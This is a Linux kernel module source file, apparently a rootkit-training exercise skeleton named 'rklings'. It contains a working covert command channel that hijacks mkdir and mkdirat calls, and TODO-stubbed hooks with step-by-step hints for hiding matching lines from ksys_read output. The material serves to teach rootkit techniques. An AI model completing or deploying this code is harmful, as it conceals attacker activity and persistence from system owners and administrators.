// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128
#define RK_TARGET_MAX 32
#define RK_NAME_MAX   64

struct rk_target_list {
	spinlock_t lock;
	char targets[RK_TARGET_MAX][RK_NAME_MAX];
	int count;
};

static struct rk_target_list content_targets;

/* TODO: Implement rk_target_add(list, name)
 * spin_lock_irqsave, check count < max, strscpy, count++, spin_unlock_irqrestore
 */
static int rk_target_add(struct rk_target_list *list, const char *name)
{
	/* TODO: implement */
	return -ENOSYS;
}

/* TODO: Implement rk_target_remove(list, idx)
 * spin_lock_irqsave, validate idx, memmove to close gap, count--, spin_unlock_irqrestore
 */
static int rk_target_remove(struct rk_target_list *list, int idx)
{
	/* TODO: implement */
	return -ENOSYS;
}

/* TODO: Implement line_matches(list, line, len)
 * Acquire spinlock. Iterate content_targets.
 * Use strnstr(line, target, len) for each entry.
 * Return true if any match, false otherwise.
 */

/* ---- ksys_read interception ---- */

struct read_data {
	void __user *ubuf;
	size_t count;
};

/* TODO: Implement read_entry(ri, regs)
 * ksys_read is not a syscall wrapper: args are directly in regs.
 * Save user buffer pointer from regs->si and count from regs->dx into ri->data.
 */
static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	/* TODO: implement */
	return 0;
}

/* TODO: Implement read_return(ri, regs)
 * Get total from regs_return_value. If <= 0, return.
 * If content_targets.count == 0, skip (no work to do).
 * kmalloc a kernel buffer, copy_from_user.
 * Walk line by line: use memchr to find '\n'.
 *   line_len = (nl found) ? (nl - pos + 1) : (end - pos)
 *   If line_matches: memmove to close gap, subtract line_len from new_total.
 *   Else: advance pos by line_len.
 * If total changed: copy_to_user, regs_set_return_value.
 * kfree.
 */
static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	/* TODO: implement */
	return 0;
}

static struct kretprobe read_probe = {
	.handler        = read_return,
	.entry_handler  = read_entry,
	.data_size      = sizeof(struct read_data),
	.maxactive      = 20,
	.kp.symbol_name = "ksys_read",
};

/* ---- mkdir command dispatcher (provided) ---- */

static int rk_dispatch(const char *name)
{
	int idx;

	if (strncmp(name, "h.c.", 4) == 0)
		return rk_target_add(&content_targets, name + 4);
	if (strncmp(name, "u.c.", 4) == 0) {
		if (kstrtoint(name + 4, 10, &idx) == 0)
			return rk_target_remove(&content_targets, idx);
		return -EINVAL;
	}

	return -ENOENT;
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_mkdir_do_entry(struct kretprobe_instance *inst,
			     const char __user *pathname)
{
	struct rk_mkdir_data *data;
	char buf[RK_PATH_MAX];
	const char *base;
	long copied;

	data = (struct rk_mkdir_data *)inst->data;
	data->intercepted = false;

	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	base = strrchr(buf, '/');
	base = base ? base + 1 : buf;

	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch(base + RK_PREFIX_LEN);
	data->intercepted = true;

	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_entry_mkdir(struct kretprobe_instance *inst,
				struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_mkdir_do_entry(inst, (const char __user *)uregs->di);
}

static int rk_mkdir_entry_mkdirat(struct kretprobe_instance *inst,
				  struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_mkdir_do_entry(inst, (const char __user *)uregs->si);
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			    struct pt_regs *regs)
{
	struct rk_mkdir_data *data;

	data = (struct rk_mkdir_data *)inst->data;
	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe rk_mkdir_probe = {
	.kp.symbol_name = "__x64_sys_mkdir",
	.entry_handler  = rk_mkdir_entry_mkdir,
	.handler        = rk_mkdir_return,
	.data_size      = sizeof(struct rk_mkdir_data),
	.maxactive      = 8,
};

static struct kretprobe rk_mkdirat_probe = {
	.kp.symbol_name = "__x64_sys_mkdirat",
	.entry_handler  = rk_mkdir_entry_mkdirat,
	.handler        = rk_mkdir_return,
	.data_size      = sizeof(struct rk_mkdir_data),
	.maxactive      = 8,
};

/* ---- module lifecycle ---- */

static int __init rk_init(void)
{
	int ret;

	spin_lock_init(&content_targets.lock);

	/* TODO: Register the read kretprobe. */
	/* TODO: Register the mkdir kretprobe. On failure, unregister read. */

	return 0;
}

static void __exit rk_exit(void)
{
	/* TODO: Unregister mkdir kretprobe, then read kretprobe. */
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings content filter");
